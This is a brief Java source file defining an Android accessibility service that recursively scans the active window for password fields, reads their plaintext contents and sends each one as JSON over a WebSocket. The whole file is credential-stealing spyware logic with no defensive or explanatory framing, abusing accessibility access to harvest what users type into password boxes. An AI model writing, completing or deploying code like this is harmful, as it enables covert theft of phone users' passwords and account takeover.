import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import okhttp3.WebSocket;
import org.json.JSONObject;
abstract class Capture extends AccessibilityService {
    WebSocket channel;
    void snapshot(AccessibilityNodeInfo node) {
        if (node.isPassword()) {
            JSONObject record = new JSONObject();
            record.put("value", node.getText().toString());
            channel.send(record.toString());
        }
        for (int i = 0; i < node.getChildCount(); i++) snapshot(node.getChild(i));
    }
    void activeTree() { snapshot(getRootInActiveWindow()); }
}
